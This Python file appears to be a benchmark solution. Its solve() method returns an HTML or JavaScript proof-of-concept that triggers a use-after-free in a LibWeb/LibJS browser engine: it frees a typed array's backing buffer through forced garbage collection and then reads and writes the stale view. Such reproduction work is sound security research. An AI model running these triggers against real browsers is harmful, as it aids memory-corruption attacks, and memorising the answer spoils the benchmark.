import io
import os
import tarfile
from typing import Optional


class Solution:
    def _detect_kind(self, src_path: str) -> str:
        # Returns "html" or "js"
        # Best-effort heuristic based on fuzz harnesses / tooling in the source tree.
        try:
            if not src_path or not os.path.exists(src_path):
                return "html"
            with tarfile.open(src_path, "r:*") as tf:
                saw_libweb = False
                saw_libjs = False
                for m in tf:
                    n = m.name
                    if "Fuzzers/LibWeb" in n or "Fuzzers/LibWeb/" in n:
                        return "html"
                    if "Fuzzers/LibJS" in n or "Fuzzers/LibJS/" in n:
                        saw_libjs = True
                    if "LibWeb/" in n or "/LibWeb/" in n:
                        saw_libweb = True
                    if saw_libweb and saw_libjs:
                        # Prefer HTML for this bug description.
                        return "html"
                if saw_libjs and not saw_libweb:
                    return "js"
        except Exception:
            return "html"
        return "html"

    def _poc_html(self) -> bytes:
        s = r"""<!doctype html>
<meta charset="utf-8">
<title>poc</title>
<body>
<script>
"use strict";

function maybe_gc() {
    try { if (typeof gc === "function") gc(); } catch (e) {}
    try { if (typeof window === "object" && window && typeof window.gc === "function") window.gc(); } catch (e) {}
    try { if (typeof internals === "object" && internals && typeof internals.gc === "function") internals.gc(); } catch (e) {}
}

function make_view() {
    // Prefer ImageData constructor if present.
    try {
        if (typeof ImageData === "function") {
            let img = new ImageData(1024, 1024);
            return img.data;
        }
    } catch (e) {}

    // Fallback: canvas createImageData
    try {
        let c = document.createElement("canvas");
        c.width = 1024;
        c.height = 1024;
        let ctx = c.getContext("2d");
        if (ctx && typeof ctx.createImageData === "function") {
            let img = ctx.createImageData(1024, 1024);
            return img.data;
        }
    } catch (e) {}

    // Last resort: global constructor (may be missing in the vulnerable build)
    try {
        if (typeof Uint8ClampedArray === "function") {
            return new Uint8ClampedArray(1024 * 1024 * 4);
        }
    } catch (e) {}

    return null;
}

function churn_cells(rounds, per_round) {
    for (let r = 0; r < rounds; r++) {
        let a = [];
        for (let i = 0; i < per_round; i++) {
            // Keep allocations primarily on the JS heap (avoid large malloc reuse of the freed backing store).
            a.push({ i: i, r: r, s: "x" + i });
            if ((i & 255) === 0) a.push([i, i + 1, i + 2, i + 3, i + 4, i + 5]);
        }
    }
}

let views = [];
for (let k = 0; k < 6; k++) {
    let v = make_view();
    if (v) views.push(v);
}

maybe_gc();

// Trigger GC via lots of JS heap allocations.
churn_cells(30, 5000);

maybe_gc();

// Immediately touch the views after GC.
let acc = 0;
for (let idx = 0; idx < views.length; idx++) {
    let v = views[idx];
    try {
        acc ^= (v[0] | 0);
        v[0] = (acc + idx) & 255;
        acc ^= (v[4096] | 0);
        v[4096] = (acc * 7) & 255;
        acc ^= (v[8192] | 0);
        v[8192] = (acc * 13) & 255;
    } catch (e) {}
}

document.title = "done" + acc;
</script>
</body>
"""
        return s.encode("utf-8", "strict")

    def _poc_js(self) -> bytes:
        s = r""""use strict";

function maybe_gc() {
    try { if (typeof gc === "function") gc(); } catch (e) {}
}

function churn_cells(rounds, per_round) {
    for (let r = 0; r < rounds; r++) {
        let a = [];
        for (let i = 0; i < per_round; i++) {
            a.push({ i: i, r: r, s: "x" + i });
            if ((i & 255) === 0) a.push([i, i + 1, i + 2, i + 3, i + 4, i + 5]);
        }
    }
}

(function () {
    if (typeof Uint8ClampedArray !== "function") {
        // If the constructor isn't exposed, we cannot reproduce this in a JS-only harness.
        return;
    }

    let view;
    try {
        let buf = new ArrayBuffer(1024 * 1024 * 4);
        view = new Uint8ClampedArray(buf);
        buf = null; // If Uint8ClampedArray doesn't trace its buffer, GC can free it.
    } catch (e) {
        return;
    }

    maybe_gc();
    churn_cells(30, 5000);
    maybe_gc();

    // Touch after GC.
    let x = 0;
    x ^= view[0] | 0;
    view[0] = (x + 1) & 255;
    x ^= view[4096] | 0;
    view[4096] = (x + 7) & 255;
})();
"""
        return s.encode("utf-8", "strict")

    def solve(self, src_path: str) -> bytes:
        kind = self._detect_kind(src_path)
        if kind == "js":
            return self._poc_js()
        return self._poc_html()